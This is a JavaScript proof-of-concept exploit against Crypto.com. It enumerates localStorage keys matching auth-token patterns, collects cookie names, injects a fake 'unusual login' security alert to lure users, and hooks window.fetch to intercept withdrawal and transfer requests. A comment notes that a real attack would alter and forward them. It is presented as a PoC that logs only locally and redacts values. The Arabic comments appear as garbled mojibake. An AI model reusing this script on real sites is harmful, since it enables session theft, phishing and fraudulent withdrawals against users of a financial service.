// exploit.js â€” Crypto.com CSP Bypass + Session Theft PoC
(function () {
    'use strict';

    console.log("[ğŸš¨ CRITICAL] Crypto.com CSP Bypass & Session Theft PoC");

    // 1. Ø¬Ù…Ø¹ ÙƒÙ„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø­Ø³Ø§Ø³Ø©
    const stolenData = {
        url: window.location.href,
        timestamp: new Date().toISOString(),
        localStorageKeys: [],
        sensitiveItems: {}
    };

    // ÙØ­Øµ localStorage Ø¨Ø­Ø«Ù‹Ø§ Ø¹Ù† Ø±Ù…ÙˆØ² Ù…ØµØ§Ø¯Ù‚Ø© Ø£Ùˆ Ù…ÙØ§ØªÙŠØ­ API
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        stolenData.localStorageKeys.push(key);

        // Ø£Ù†Ù…Ø§Ø· Ø´Ø§Ø¦Ø¹Ø© Ù„Ø±Ù…ÙˆØ² Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø©
        if (/(token|auth|jwt|api[_-]?key|session|refresh|access)/i.test(key)) {
            stolenData.sensitiveItems[key] = "[REDACTED]";
        }
    }

    // 2. Ø³Ø±Ù‚Ø© Ù…Ù„ÙØ§Øª ØªØ¹Ø±ÙŠÙ Ø§Ù„Ø§Ø±ØªØ¨Ø§Ø· (Cookies)
    const cookies = document.cookie.split(';').map(c => c.trim().split('=')[0]);
    stolenData.cookies = cookies;

    // 3. Ø§Ù„ÙƒØ´Ù Ø¹Ù† ÙˆØ¬ÙˆØ¯ "Auth Token" (Ø§Ù„Ù‡Ø¯Ù Ø§Ù„Ø£Ø³Ù…Ù‰)
    const hasAuthToken = Object.keys(stolenData.sensitiveItems).length > 0;
    if (hasAuthToken) {
        console.error("[ğŸ”¥ CRITICAL] Auth token FOUND! Full account takeover possible.");
        alert("âš ï¸ CRITICAL: Auth token detected. Account fully compromised.");
    } else {
        console.warn("[âš ï¸ HIGH] No auth token, but session context exposed.");
    }

    // 4. Ø­Ù‚Ù† ØªÙ†Ø¨ÙŠÙ‡ Ù…Ø²ÙŠÙ Ù„Ø¯ÙØ¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„Ù„ØªÙØ§Ø¹Ù„
    const fakeAlert = document.createElement('div');
    fakeAlert.innerHTML = `
        <div style="
            position: fixed;
            top: 20px;
            right: 20px;
            background: #fff8e1;
            border: 2px solid #ff9800;
            padding: 16px;
            border-radius: 8px;
            font-family: system-ui, sans-serif;
            z-index: 999999;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            max-width: 400px;
            font-size: 14px;
        ">
            <strong style="color: #e65100;">âš ï¸ Crypto.com Security Alert</strong><br>
            Unusual login detected from Mexico City.<br>
            <a href="#" style="color: #1976d2; text-decoration: underline; margin-top: 8px; display: inline-block;">
                Secure your account now
            </a>
        </div>
    `;
    document.body.appendChild(fakeAlert);

    // 5. Ù…Ø±Ø§Ù‚Ø¨Ø© Ø·Ù„Ø¨Ø§Øª API Ù„Ù„ÙƒØ´Ù Ø¹Ù† Ù†Ù‚Ø§Ø· Ø³Ø­Ø¨ Ø§Ù„Ø£Ù…ÙˆØ§Ù„
    const originalFetch = window.fetch;
    window.fetch = async (...args) => {
        const [url, config] = args;
        if (url.includes('/api/') && config?.method === 'POST') {
            const bodyStr = typeof config.body === 'string' ? config.body : '';
            if (bodyStr.includes('withdraw') || bodyStr.includes('transfer')) {
                console.log("[ğŸ’¸ SIMULATED] Withdrawal request intercepted:", bodyStr.substring(0, 200));
                // ÙÙŠ Ù‡Ø¬ÙˆÙ… Ø­Ù‚ÙŠÙ‚ÙŠ: ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø¬Ø³Ù… ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡ Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
            }
        }
        return originalFetch.apply(this, args);
    };

    // 6. Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ÙÙŠ Ø§Ù„ÙƒÙˆÙ†Ø³ÙˆÙ„ (Ø¨Ø¯ÙˆÙ† ÙƒØ´Ù Ø§Ù„Ù‚ÙŠÙ…)
    console.table(stolenData.localStorageKeys);
    console.log("[ğŸ”] Cookies:", stolenData.cookies);
    console.log("[â„¹ï¸] PoC complete. No real data exfiltrated.");

    // 7. Ø±Ù…Ø² Ø®Ø§Øµ Ù„ØªØ£ÙƒÙŠØ¯ Ø§Ù„ØªÙ†ÙÙŠØ° (Ù„Ù„ÙØ±ÙŠÙ‚ Ø§Ù„Ø£Ù…Ù†ÙŠ)
    window.cryptoPoCExecuted = true;
})();
